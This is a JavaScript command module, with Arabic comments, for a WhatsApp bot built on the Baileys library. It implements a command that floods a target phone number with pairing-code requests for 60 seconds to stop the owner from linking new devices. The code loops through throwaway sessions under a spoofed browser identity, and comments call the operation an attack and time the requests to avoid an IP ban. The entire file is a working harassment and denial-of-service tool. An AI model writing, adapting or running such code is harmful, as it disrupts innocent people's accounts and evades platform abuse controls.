import { makeWASocket, useMultiFileAuthState, delay } from '@whiskeysockets/baileys';
import fs from 'fs';
import path from 'path';
import chalk from 'chalk';
import pino from 'pino';

// إعدادات الأمر
export const NovaUltra = {
    command: "تعطيل",
    description: "إغراق الرقم بطلبات ربط (Pairing Code) لمنعه من ربط أجهزة جديدة مؤقتاً",
    category: "owner",
    elite: "on",   // متاح للنخبة فقط
    lock: "off",
    group: true,
    prv: false,
};

async function execute({ sock, msg, args }) {
    const chatId = msg.key.remoteJid;

    // 1. استخراج الرقم المستهدف
    let targetNumber = args[0] ? args[0].replace(/[^0-9]/g, '') : null;

    if (!targetNumber || targetNumber.length < 10) {
        console.log(chalk.red('❌ أدخل رقم صالح بعد الأمر'));
        return await sock.sendMessage(chatId, { text: "❌ الرجاء إدخال رقم صحيح بعد الأمر." }, { quoted: msg });
    }

    // 2. إعداد مسار الجلسة المؤقتة
    // نستخدم مساراً داخل temp لتجنب الفوضى
    const tempDir = path.join(process.cwd(), "nova", "temp_sessions");
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
    
    const sessionDir = path.join(tempDir, `disable_${targetNumber}`);

    // إشعار البدء
    await sock.sendMessage(chatId, { text: `*☠️ بدء هجوم التعطيل على ${targetNumber}...*\n⏳ المدة: 60 ثانية.` }, { quoted: msg });
    console.log(chalk.blue(`[Disable] بدء الهجوم على: ${targetNumber}`));

    let isActive = true;

    // دالة التنظيف
    const cleanUp = () => {
        try {
            if (fs.existsSync(sessionDir)) {
                fs.rmSync(sessionDir, { recursive: true, force: true });
            }
        } catch (e) { }
    };

    // إيقاف الهجوم بعد 60 ثانية
    setTimeout(() => {
        isActive = false;
        cleanUp();
        console.log(chalk.green(`[Disable] انتهى الهجوم على ${targetNumber}`));
        sock.sendMessage(chatId, { text: `*✅ انتهت عملية التعطيل للرقم ${targetNumber}*` });
    }, 60000);

    // 3. حلقة الهجوم
    while (isActive) {
        try {
            // تنظيف الجلسة السابقة لضمان طلب كود جديد
            cleanUp();
            
            const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
            
            const tempSock = makeWASocket({
                auth: state,
                logger: pino({ level: 'silent' }),
                printQRInTerminal: false,
                browser: ['Ubuntu', 'Chrome', '20.0.04'], // متصفح وهمي
                markOnlineOnConnect: false
            });

            // لا نحتاج لحفظ الاعتمادات فعلياً لأننا نحذف الجلسة، لكن Baileys يطلبها
            tempSock.ev.on('creds.update', saveCreds);

            // انتظار قليل لتهيئة المقبس
            await delay(1000);

            if (!isActive) break;

            // طلب كود الربط
            const code = await tempSock.requestPairingCode(targetNumber);
            console.log(chalk.cyan(`[Disable] 🔑 كود مرسل لـ ${targetNumber}: ${code}`));

            // إغلاق المقبس المؤقت
            tempSock.end(undefined);

        } catch (err) {
            console.error(chalk.red(`[Disable] ❌ فشل المحاولة: ${err.message}`));
        }

        // الانتظار 5 ثواني قبل الطلب التالي (لتجنب الحظر الفوري للـ IP)
        if (isActive) await delay(5000);
    }
}

export default { NovaUltra, execute };